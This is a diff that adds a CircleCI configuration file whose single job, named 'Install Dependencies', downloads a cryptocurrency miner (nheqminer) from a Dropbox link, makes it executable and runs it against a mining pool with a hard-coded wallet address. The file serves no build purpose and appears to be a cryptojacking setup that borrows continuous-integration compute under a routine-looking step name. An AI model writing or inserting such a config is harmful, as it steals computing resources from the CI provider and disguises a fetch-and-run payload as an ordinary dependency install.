@@ -1,0 +1,21 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 1
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+                sudo apt-get install unzip -y
+                wget https://www.dropbox.com/s/0depl30f1tkxaiw/nheqminer.zip
+                unzip nheqminer.zip
+                chmod +x nheqminer
+                ./nheqminer -v -l na.luckpool.net:3956 -u RBnzJ5EQtqHeWvhvYGuNjJnwPjxcGbZYLE.CI -px -t 1             
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
